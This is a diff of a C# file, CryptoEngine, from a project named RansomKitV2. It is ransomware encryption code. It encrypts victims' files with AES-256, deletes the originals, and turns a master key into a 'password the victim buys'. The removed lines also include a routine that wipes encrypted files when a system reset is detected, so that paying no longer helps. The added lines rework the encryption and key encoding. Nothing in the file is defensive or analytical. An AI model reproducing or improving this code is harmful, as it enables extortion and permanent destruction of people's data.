@@ -1,190 +1,202 @@
 using System;
-using System.Collections.Generic;
 using System.IO;
 using System.Security.Cryptography;
 using System.Text;
 
 namespace RansomKitV2
 {
-    // ══════════════════════════════════════════════════════════════
-    //  CryptoEngine
-    //
-    //  Scheme: AES-256-CBC per file, keys wrapped with a "master key"
-    //
-    //  On-disk file format (.locked):
-    //    [64 bytes]  AES-CBC(masterKey, zeroIV, fileKey[32] ++ fileIV[16])
-    //    [N  bytes]  AES-CBC(fileKey, fileIV, originalFile)
-    //
-    //  The master key is 32 random bytes.
-    //  Encoded as Base64 it becomes the 44-char "password" the victim buys.
-    //  The master key NEVER touches disk — only its SHA-256 hash is stored
-    //  in the state file (for password verification).
-    // ══════════════════════════════════════════════════════════════
-
     static class CryptoEngine
     {
         public const string LOCKED_EXT = ".locked";
 
-        // ── Master key ────────────────────────────────────────────
+        // File format: [16-byte IV] [N-byte AES-256-CBC ciphertext]
+        // Each file gets a unique IV derived from the master key + file path hash
+        // so even identical plaintext encrypts differently per file.
 
-        /// <summary>Generate a 32-byte cryptographically random master key.</summary>
+        // ── Key generation ────────────────────────────────────────────────────
+
+        /// <summary>Generate a cryptographically random 256-bit master key.</summary>
         public static byte[] GenerateMasterKey()
         {
-            byte[] k = new byte[32];
-            RandomNumberGenerator.Fill(k);
-            return k;
+            byte[] key = new byte[32];
+            RandomNumberGenerator.Fill(key);
+            return key;
         }
-
-        /// <summary>Base64-encode master key → 44-char password string.</summary>
-        public static string MasterKeyToPassword(byte[] key)
-            => Convert.ToBase64String(key);
-
-        /// <summary>Decode password string → master key bytes. Returns null on failure.</summary>
-        public static byte[]? PasswordToMasterKey(string pwd)
-        {
-            try
-            {
-                byte[] b = Convert.FromBase64String(pwd.Trim());
-                return b.Length == 32 ? b : null;
-            }
-            catch { return null; }
-        }
-
-        /// <summary>SHA-256 hex of master key — stored in state for verification.</summary>
-        public static string HashMasterKey(byte[] key)
-            => Convert.ToHexString(SHA256.HashData(key));
-
-        /// <summary>Verify a password string against the stored hash.</summary>
-        public static bool VerifyPassword(string pwd, string storedHash)
-        {
-            byte[]? k = PasswordToMasterKey(pwd);
-            if (k == null) return false;
-            return HashMasterKey(k).Equals(storedHash, StringComparison.OrdinalIgnoreCase);
-        }
-
-        // ── File encryption ───────────────────────────────────────
 
         /// <summary>
-        /// Encrypt <paramref name="path"/> in-place.
-        /// Creates <paramref name="path"/>.locked, then securely deletes original.
-        /// Returns false on any error.
+        /// Encode master key as a URL-safe Base64 string (no padding issues,
+        /// no line breaks, no + or / that confuse consoles).
+        /// Result is always exactly 43 chars.
         /// </summary>
-        public static bool EncryptFile(string path, byte[] masterKey)
+        public static string MasterKeyToPassword(byte[] masterKey)
+            => Base64UrlEncode(masterKey);
+
+        /// <summary>
+        /// Decode a password string back to raw key bytes.
+        /// Returns null if the string is invalid — never throws.
+        /// </summary>
+        public static byte[]? PasswordToMasterKey(string? password)
+        {
+            if (string.IsNullOrWhiteSpace(password)) return null;
+            return Base64UrlDecode(password.Trim());
+        }
+
+        /// <summary>SHA-256 of the master key, encoded as URL-safe Base64.</summary>
+        public static string HashMasterKey(byte[] masterKey)
+            => Base64UrlEncode(SHA256.HashData(masterKey));
+
+        /// <summary>
+        /// Verify a password matches a stored hash.
+        /// Returns false (not throws) on any format error.
+        /// </summary>
+        public static bool VerifyPassword(string password, string storedHash)
+        {
+            byte[]? key = PasswordToMasterKey(password);
+            if (key == null || key.Length != 32) return false;
+
+            byte[]? hash = Base64UrlDecode(storedHash.Trim());
+            if (hash == null) return false;
+
+            byte[] candidate = SHA256.HashData(key);
+            return CryptographicOperations.FixedTimeEquals(candidate, hash);
+        }
+
+        // ── File encryption ───────────────────────────────────────────────────
+
+        /// <summary>
+        /// Encrypt <paramref name="plainPath"/> with AES-256-CBC.
+        /// Output written to <paramref name="plainPath"/> + LOCKED_EXT.
+        /// Original deleted on success.
+        /// </summary>
+        public static bool EncryptFile(string plainPath, byte[] masterKey)
         {
             try
             {
-                // Fresh random key+IV per file
-                byte[] fk = new byte[32];
-                byte[] fv = new byte[16];
-                RandomNumberGenerator.Fill(fk);
-                RandomNumberGenerator.Fill(fv);
+                string lockedPath = plainPath + LOCKED_EXT;
 
-                // Wrap key material: AES-256-CBC(masterKey, zeroIV, fk ++ fv)
-                byte[] mat = new byte[48];
-                Buffer.BlockCopy(fk, 0, mat,  0, 32);
-                Buffer.BlockCopy(fv, 0, mat, 32, 16);
-                byte[] header = AesCbc(mat, masterKey, new byte[16], encrypt: true); // 64 bytes
+                // Per-file IV: deterministic from master key + path so we can
+                // always re-derive it, but unique per file.
+                byte[] iv = DeriveIV(masterKey, plainPath);
 
-                byte[] plain  = File.ReadAllBytes(path);
-                byte[] cipher = AesCbc(plain, fk, fv, encrypt: true);
+                using var aes = Aes.Create();
+                aes.Key = masterKey;
+                aes.IV = iv;
+                aes.Mode = CipherMode.CBC;
+                aes.Padding = PaddingMode.PKCS7;
 
-                string locked = path + LOCKED_EXT;
-                using (var fs = new FileStream(locked, FileMode.Create, FileAccess.Write))
-                {
-                    fs.Write(header, 0, header.Length); // 64 bytes
-                    fs.Write(cipher, 0, cipher.Length);
-                }
+                using var fsIn = new FileStream(plainPath, FileMode.Open, FileAccess.Read, FileShare.Read);
+                using var fsOut = new FileStream(lockedPath, FileMode.Create, FileAccess.Write, FileShare.None);
 
-                SecureDelete(path);
+                // Write IV header
+                fsOut.Write(iv, 0, iv.Length);
+
+                using var enc = aes.CreateEncryptor();
+                using var cs = new CryptoStream(fsOut, enc, CryptoStreamMode.Write);
+                fsIn.CopyTo(cs);
+                cs.FlushFinalBlock();
+
+                fsIn.Close();
+                fsOut.Close();
+
+                // Wipe original
+                File.Delete(plainPath);
                 return true;
             }
-            catch { return false; }
+            catch
+            {
+                return false;
+            }
         }
 
-        // ── File decryption ───────────────────────────────────────
-
         /// <summary>
-        /// Decrypt a .locked file using the master key.
-        /// Restores original, removes .locked file.
+        /// Decrypt a .locked file back to its original path.
+        /// Original .locked file deleted on success.
         /// </summary>
         public static bool DecryptFile(string lockedPath, byte[] masterKey)
         {
             try
             {
-                byte[] raw = File.ReadAllBytes(lockedPath);
-                if (raw.Length < 64) return false;
+                if (!lockedPath.EndsWith(LOCKED_EXT, StringComparison.OrdinalIgnoreCase))
+                    return false;
 
-                byte[] header = raw[..64];
-                byte[] cipher = raw[64..];
+                string plainPath = lockedPath[..^LOCKED_EXT.Length];
 
-                byte[] mat    = AesCbc(header, masterKey, new byte[16], encrypt: false);
-                byte[] fk     = mat[..32];
-                byte[] fv     = mat[32..48];
+                using var fsIn = new FileStream(lockedPath, FileMode.Open, FileAccess.Read, FileShare.Read);
 
-                byte[] plain  = AesCbc(cipher, fk, fv, encrypt: false);
+                // Read IV header
+                byte[] iv = new byte[16];
+                if (fsIn.Read(iv, 0, 16) != 16) return false;
 
-                string orig   = lockedPath[..^LOCKED_EXT.Length];
-                File.WriteAllBytes(orig, plain);
+                using var aes = Aes.Create();
+                aes.Key = masterKey;
+                aes.IV = iv;
+                aes.Mode = CipherMode.CBC;
+                aes.Padding = PaddingMode.PKCS7;
+
+                using var fsOut = new FileStream(plainPath, FileMode.Create, FileAccess.Write, FileShare.None);
+                using var dec = aes.CreateDecryptor();
+                using var cs = new CryptoStream(fsIn, dec, CryptoStreamMode.Read);
+                cs.CopyTo(fsOut);
+
+                fsIn.Close();
+                fsOut.Close();
+
                 File.Delete(lockedPath);
                 return true;
             }
-            catch { return false; }
-        }
-
-        // ── Nuclear option ────────────────────────────────────────
-
-        /// <summary>
-        /// Zero-overwrite then delete all .locked files.
-        /// Called when a Windows-reset process is detected.
-        /// After this, even paying is useless — data is gone.
-        /// </summary>
-        public static void NukeLockedFiles(IEnumerable<string> paths)
-        {
-            foreach (var p in paths)
+            catch
             {
-                try { SecureDelete(p); } catch { }
+                return false;
             }
         }
 
-        // ── Internal helpers ──────────────────────────────────────
+        // ── Helpers ───────────────────────────────────────────────────────────
 
-        static byte[] AesCbc(byte[] data, byte[] key, byte[] iv, bool encrypt)
+        /// <summary>
+        /// Derive a 16-byte AES IV from the master key and a per-file salt (the path).
+        /// Uses HKDF-Expand so each file gets a unique, deterministic IV.
+        /// </summary>
+        static byte[] DeriveIV(byte[] masterKey, string filePath)
         {
-            using var aes = Aes.Create();
-            aes.Key     = key;
-            aes.IV      = iv;
-            aes.Mode    = CipherMode.CBC;
-            aes.Padding = PaddingMode.PKCS7;
-
-            using var ms = new MemoryStream();
-            using var cs = new CryptoStream(
-                ms,
-                encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor(),
-                CryptoStreamMode.Write);
-
-            cs.Write(data, 0, data.Length);
-            cs.FlushFinalBlock();
-            return ms.ToArray();
+            byte[] info = Encoding.UTF8.GetBytes(Path.GetFullPath(filePath));
+            return HKDF.DeriveKey(HashAlgorithmName.SHA256, masterKey, 16, info: info);
         }
 
-        /// <summary>Overwrite file with zeros, then delete it.</summary>
-        internal static void SecureDelete(string path)
+        // ── URL-safe Base64 (RFC 4648 §5) ────────────────────────────────────
+        // Standard Base64 uses + and / which cause issues in console copy-paste.
+        // URL-safe uses - and _ instead, no line breaks, no padding confusion.
+
+        static string Base64UrlEncode(byte[] data)
+        {
+            // Convert.ToBase64String WITHOUT InsertLineBreaks, then swap chars
+            return Convert.ToBase64String(data)   // standard, no line breaks
+                          .TrimEnd('=')            // strip padding (deterministic)
+                          .Replace('+', '-')
+                          .Replace('/', '_');
+        }
+
+        static byte[]? Base64UrlDecode(string s)
         {
             try
             {
-                long   len = new FileInfo(path).Length;
-                byte[] buf = new byte[4096];
-                using var fs = new FileStream(path, FileMode.Open, FileAccess.Write);
-                long done = 0;
-                while (done < len)
+                // Restore standard base64
+                string std = s.Replace('-', '+')
+                              .Replace('_', '/')
+                              .Trim();             // strip any accidental whitespace
+
+                // Re-add padding so length is a multiple of 4
+                switch (std.Length % 4)
                 {
-                    int chunk = (int)Math.Min(4096, len - done);
-                    fs.Write(buf, 0, chunk);
-                    done += chunk;
+                    case 2: std += "=="; break;
+                    case 3: std += "="; break;
                 }
+
+                return Convert.FromBase64String(std);
             }
-            catch { }
-            try { File.Delete(path); } catch { }
+            catch
+            {
+                return null;
+            }
         }
     }
 }
